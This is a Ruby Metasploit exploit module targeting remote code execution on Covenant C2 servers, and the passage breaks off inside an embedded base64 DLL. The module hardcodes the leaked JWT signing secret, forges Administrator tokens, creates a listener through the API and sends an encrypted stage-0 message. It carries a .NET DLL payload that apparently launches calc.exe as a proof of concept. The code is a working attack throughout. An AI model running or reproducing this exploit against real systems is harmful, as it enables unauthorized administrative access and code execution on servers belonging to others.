##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  
  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Covenant C2 JWT Remote Code Execution Exploit',
      'Description' => %q{
        Due to an accidental commit of an ephemeral development application settings file, the secret
        value of all JWTs issued by Covenant was locked to a single value across all deployments.
        This vulnerability affect all Covenant from March 3rd, 2019 to July 13th, 2020.
      },
      'Author' => [
        'mekhalleh (RAMELLA Sébastien)' # module author (Zeop Entreprise)
      ],
      'References' => [
        ['URL', 'https://blog.null.farm/hunting-the-hunters'],
      ],
      'DisclosureDate' => '2020-10-27',
      'License' => MSF_LICENSE,
      'Platform' => ['windows'],
      'Arch' => [ARCH_X86, ARCH_X64],
      'Privileged' => true,
      'DefaultOptions' => {
        'RPORT' => 7443,
        'SSL' => true
      },
      'Targets' => [
        ['Automatic (DLL)',
          'Platform' => 'windows',
          'Arch' => [ARCH_X86, ARCH_X64],
          'Type' => :dll,
          #'DefaultOptions' => {
          #  'PAYLOAD' => 'php/meterpreter/reverse_tcp'
          #}
        ],
      ],
      'DefaultTarget' => 0,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      OptInt.new('C2_RPORT', [true, 'The TCP port for the listener.', 8080])
    ])

    register_advanced_options([
      OptBool.new('ForceExploit', [false, 'Override check result', false])
    ])
  end

  def aes256_cbc_encrypt(key, data)
    key = Digest::SHA256.digest(key) if (key.kind_of?(String) && 32 != key.bytesize)
    iv = SecureRandom.random_bytes(16)
    iv = Digest::MD5.digest(iv) if (iv.kind_of?(String) && 16 != iv.bytesize)

    aes = OpenSSL::Cipher.new('AES-256-CBC')
    aes.encrypt
    aes.key = key
    aes.iv = iv
    ciphered = aes.update(data) + aes.final

    hmac = OpenSSL::Digest.new('sha256')
    signed = OpenSSL::HMAC.digest(hmac, key, ciphered)

    return([ciphered, iv, signed])
  end

  def check_tcp_port(ip, port)
    begin
      sock = Rex::Socket::Tcp.create(
        'PeerHost' => ip,
        'PeerPort' => port,
        'Proxies' => datastore['Proxies']
      )
    rescue ::Rex::ConnectionRefused, Rex::ConnectionError
      return false
    end

    sock.close
    return true
  end

  def create_listener(profile_id)
    data = {
      'useSSL': false,
      'urls': [
        "http://#{datastore['RHOSTS']}:#{datastore['C2_RPORT']}"
      ],
      'id': 0,
      'name': @listener_name,
      'bindAddress': "#{datastore['RHOSTS']}",
      'bindPort': datastore['C2_RPORT'],
      'connectAddresses': [
        "#{datastore['RHOSTS']}"
      ],
      'connectPort': datastore['C2_RPORT'],
      'profileId': profile_id.to_i,
      'listenerTypeId': read_listener_type('HTTP'),
      'status': 'Active'
    }
    response = request_api('POST', normalize_uri('api', 'listeners', 'http'), data.to_json)

    return true if response && response.code == 200

    false
  end

  def generate_jwt(username = nil, userid = nil)
    secret = '%cYA;YK,lxEFw[&P{2HwZ6Axr,{e&3o_}_P%NX+(q&0Ln^#hhft9gTdm\'q%1ugAvfq6rC'
    username = Rex::Text.rand_text_alpha(6..8) if username.nil?
    userid = random_id if username.nil?

    jwt_hdr = {'typ':'JWT', 'alg':'HS256'}
    jwt_pld = {
      'sub': "#{username}",
      'jti': "#{random_id}",
      'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier': "#{userid}",
      'http://schemas.microsoft.com/ws/2008/06/identity/claims/role': ["User", "Administrator"],
      'exp': 1615445546,
      'iss': 'Covenant',
      'aud': 'Covenant'
    }

    token_hdr = Base64.urlsafe_encode64(jwt_hdr.to_json.encode('utf-8')).gsub('=', '')
    token_pld = Base64.urlsafe_encode64(jwt_pld.to_json.encode('utf-8')).gsub('=', '')

    digest_sha256 = OpenSSL::Digest.new('sha256')
    signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(digest_sha256, secret, "#{token_hdr}.#{token_pld}"))

    return "#{token_hdr}.#{token_pld}.#{signature.gsub('=', '')}"
  end

  def generate_stage0(aes_key, guid)
    headers = {}
    headers['Cookies'] = "ASPSESSIONID=#{guid}; SESSIONID=1552332971750"

    message = '<RSAKeyValue><Modulus>tqwoOYfwOkdfax+Er6P3leoKE/w5wWYgmb/riTpSSWCA6T2JklWrPtf9z3s/k0wIi5pX3jWeC5RV5Y/E23jQXPfBB9jW95pIqxwhZ1wC2UOVA8eSCvqbTpqmvTuFPat8ek5piS/QQPSZG98vLsfJ2jQT6XywRZ5JgAZjaqmwUk/lhbUedizVAnYnVqcR4fPEJj2ZVPIzerzIFfGWQrSEbfnjp4F8Y6DjNSTburjFgP0YdXQ9S7qCJ983vM11LfyZiGf97/wFIzXf7pl7CsA8nmQP8t46h8b5hCikXl1waEQLEW+tHRIso+7nBv7ciJ5WgizSAYfXfePlw59xp4UMFQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>'

    ciphered, iv, signed = aes256_cbc_encrypt(Base64.decode64(aes_key), message)
    data = {
      'GUID': "#{guid}",
      'Type': 0,
      'Meta': '',
      'IV': Base64.encode64(iv).strip,
      'EncryptedMessage': Base64.encode64(ciphered).gsub("\n", ''),
      'HMAC': Base64.encode64(signed).strip
    }

    begin
      cli = Rex::Proto::Http::Client.new(datastore['RHOSTS'], datastore['C2_RPORT'], {}, false, nil, datastore['Proxies'])
      cli.connect

      request = cli.request_cgi({
        'method' => 'POST',
        'uri' => '/en-us/test.html',
        'headers' => headers,
        'agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'vars_post' => {
          'i' => 'a19ea23062db990386a3a478cb89d52e',
          'data' => Base64.urlsafe_encode64(data.to_json),
          'session' => '75db-99b1-25fe4e9afbe58696-320bea73'

        }
      })
      response = cli.send_recv(request)
      cli.close
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error('HTTP connection failed.')
      return false
    end
  end

  def generate_transform_payload # TODO
    # POC: execute calc
    # dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAOl/y5EAAAAAAAAAAOAAIgALATAAAAgAAAAIAAAAAAAAqiYAAAAgAAAAQAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAFcmAABPAAAAAEAAADAFAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAABoJQAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAsAYAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAADAFAAAAQAAAAAYAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAACLJgAAAAAAAEgAAAACAAUAbCAAAPwEAAABAAAAAgAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF4CKAsAAApyAQAAcHIRAABwKAwAAAomKgYqAABCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAACYAQAAI34AAAQCAAD4AQAAI1N0cmluZ3MAAAAA/AMAACwAAAAjVVMAKAQAABAAAAAjR1VJRAAAADgEAADEAAAAI0Jsb2IAAAAAAAAAAgAAAUcVAAAJAAAAAPoBMwAWAAABAAAADQAAAAIAAAACAAAAAQAAAAwAAAAKAAAAAQAAAAIAAAAAAFkBAQAAAAAABgDHAJwBBgAZAZwBBgAhAIkBDwC8AQAABgBMAD8BBgAAAXEBBgCoAHEBBgBlAHEBBgCCAHEBBgDnAHEBBgA1AHEBBgDrAWUBCgDjAYkBAAAAAAEAAAAAAAEAAQABABAANwEKADEAAQABAFAgAAAAAIYYgwEGAAEAaCAAAAAAlgBsASUAAQAAAAEAywEJAIMBAQARAIMBBgAZAIMBCgApAIMBEAAxAIMBEAA5AIMBEABBAIMBEABJAIMBEABRAIMBEABZAIMBEABhAIMBBgBpAPIBFQAuAAsAKwAuABMANAAuABsAUwAuACMAXAAuACsAkgAuADMAnwAuADsArAAuAEMAuQAuAEsAkgAuAFMAkgAEgAAAAQAAAAAAAAAAAAAAAAAKAAAABAACAAIAAAAAAAAAHAASAAAAAAAEAAIAAgAAAAAAAAAcANABAAAAAAAAAAAAPE1vZHVsZT4AUGF5bG9hZABTeXN0ZW0uUnVudGltZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlJbmZvcm1hdGlvbmFsVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEV4ZWN1dGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBQYXlsb2FkLmRsbABTeXN0ZW0ATWFpbgBTeXN0ZW0uUmVmbGVjdGlvbgAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBhcmdzAFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzAE9iamVjdABTdGFydAAAD2MAbQBkAC4AZQB4AGUAABcvAEMAIABjAGEAbABjAC4AZQB4AGUAAAAAAGUJYhnDlrJIoGWECAM5RrwABCABAQgDIAABBSABARERBCABAQ4GAAISNQ4OCLA/X38R1Qo6BQABAR0OCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAADUBABguTkVU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'
    dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAOl/y5EAAAAAAAAAAOAAIgALATAAAAgAAAAIAAAAAAAAqiYAAAAgAAAAQAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAFcmAABPAAAAAEAAADAFAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAABoJQAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAsAYAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAADAFAAAAQAAAAAYAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAACLJgAAAAAAAEgAAAACAAUAbCAAAPwEAAABAAAAAgAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF4CKAsAAApyAQAAcHIRAABwKAwAAAomKgYqAABCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAACYAQAAI34AAAQCAAD4AQAAI1N0cmluZ3MAAAAA/AMAACwAAAAjVVMAKAQAABAAAAAjR1VJRAAAADgEAADEAAAAI0Jsb2IAAAAAAAAAAgAAAUcVAAAJAAAAAPoBMwAWAAABAAAADQAAAAIAAAACAAAAAQAAAAwAAAAKAAAAAQAAAAIAAAAAAFkBAQAAAAAABgDHAJwBBgAZAZwBBgAhAIkBDwC8AQAABgBMAD8BBgAAAXEBBgCoAHEBBgBlAHEBBgCCAHEBBgDnAHEBBgA1AHEBBgDrAWUBCgDjAYkBAAAAAAEAAAAAAAEAAQABABAANwEKADEAAQABAFAgAAAAAIYYgwEGAAEAaCAAAAAAlgBsASUAAQAAAAEAywEJAIMBAQARAIMBBgAZAIMBCgApAIMBEAAxAIMBEAA5AIMBEABBAIMBEABJAIMBEABRAIMBEABZAIMBEABhAIMBBgBpAPIBFQAuAAsAKwAuABMANAAuABsAUwAuACMAXAAuACsAkgAuADMAnwAuADsArAAuAEMAuQAuAEsAkgAuAFMAkgAEgAAAAQAAAAAAAAAAAAAAAAAKAAAABAACAAIAAAAAAAAAHAASAAAAAAAEAAIAAgAAAAAAAAAcANABAAAAAAAAAAAAPE1vZHVsZT4AUGF5bG9hZABTeXN0ZW0uUnVudGltZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlJbmZvcm1hdGlvbmFsVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEV4ZWN1dGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBQYXlsb2FkLmRsbABTeXN0ZW0ATWFpbgBTeXN0ZW0uUmVmbGVjdGlvbgAuY3RvcgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBhcmdzAFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzAE9iamVjdABTdGFydAAAD2MAbQBkAC4AZQB4AGUAABcvAEMAIABjAGEAbABjAC4AZQB4AGUAAAAAAGUJYhnDlrJIoGWECAM5RrwABCABAQgDIAABBSABARERBCABAQ4GAAISNQ4OCLA/X38R1Qo6BQABAR0OCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAADUBABguTkVU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